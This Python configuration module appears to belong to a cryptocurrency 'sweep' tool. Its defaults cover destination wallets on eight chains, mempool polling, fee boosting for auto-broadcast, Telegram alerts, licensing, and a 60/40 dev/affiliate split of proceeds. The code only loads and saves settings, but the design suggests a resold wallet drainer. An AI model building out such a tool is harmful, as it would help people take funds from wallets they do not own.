import json
import os
import logging
from typing import Any

logger = logging.getLogger(__name__)

DEFAULT_CONFIG_PATH = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "config.json")


DEFAULT_CONFIG: dict[str, Any] = {
    "telegram": {
        "bot_token": "",
        "chat_id": "",
        "enabled": False,
    },
    "sweep": {
        "destination_wallet": {
            "BTC": "",
            "ETH": "",
            "LTC": "",
            "SOL": "",
            "BNB": "",
            "XRP": "",
            "TRON": "",
            "POLYGON": "",
        },
        "min_balance_usd": 10.0,
        "auto_broadcast": False,
        "priority_fee_multiplier": 1.5,
        "check_interval": 30,
    },
    "api_keys": {
        "etherscan": "",
        "bscscan": "",
        "polygonscan": "",
        "coingecko": "",
    },
    "license": {
        "secret_key": "",
        "telegram_bot_token": "",
        "enabled": False,
    },
    "affiliate": {
        "enabled": False,
        "dev_split": 0.6,
        "affiliate_split": 0.4,
        "dev_wallet": "",
        "affiliate_wallet": "",
    },
    "scan": {
        "check_erc20_tokens": True,
        "check_trc20_tokens": True,
        "mempool_poll_interval": 30,
        "balance_cache_ttl": 30,
        "token_contracts": {
            "ETH": ["USDT", "USDC", "DAI", "WBTC"],
            "BNB": ["USDT", "USDC", "BUSD"],
            "POLYGON": ["USDT", "USDC", "DAI"],
            "TRON": ["USDT", "USDC", "USDD"],
        },
    },
    "api": {
        "auto_start_server": False,
        "host": "127.0.0.1",
        "port": 8000,
    },
    "webhook": {
        "target_url": "",
    },
}


class ConfigManager:
    def __init__(self, path: str = DEFAULT_CONFIG_PATH):
        self._path = path
        self._data: dict[str, Any] = dict(DEFAULT_CONFIG)
        self._load()

    def _load(self) -> None:
        if os.path.exists(self._path):
            try:
                with open(self._path) as f:
                    loaded = json.load(f)
                for section, values in loaded.items():
                    if section in self._data and isinstance(self._data[section], dict):
                        self._data[section].update(values)
                    else:
                        self._data[section] = values
                logger.info("Config loaded from %s", self._path)
            except Exception as e:
                logger.warning("Failed to load config: %s, using defaults", e)
        else:
            self._save()
            logger.info("Created default config at %s", self._path)

    def _save(self) -> None:
        try:
            with open(self._path, "w") as f:
                json.dump(self._data, f, indent=4)
        except Exception as e:
            logger.warning("Failed to save config: %s", e)

    def get(self, section: str, key: str, default: Any = None) -> Any:
        return self._data.get(section, {}).get(key, default)

    def get_section(self, section: str) -> dict:
        return self._data.get(section, {})

    @property
    def data(self) -> dict:
        return dict(self._data)

    def get_destination(self, chain: str) -> str:
        return self._data.get("sweep", {}).get("destination_wallet", {}).get(chain, "")

    @property
    def telegram_enabled(self) -> bool:
        return bool(self._data.get("telegram", {}).get("enabled") and self._data["telegram"].get("bot_token"))

    @property
    def sweep_enabled(self) -> bool:
        return bool(self._data.get("sweep", {}).get("auto_broadcast"))
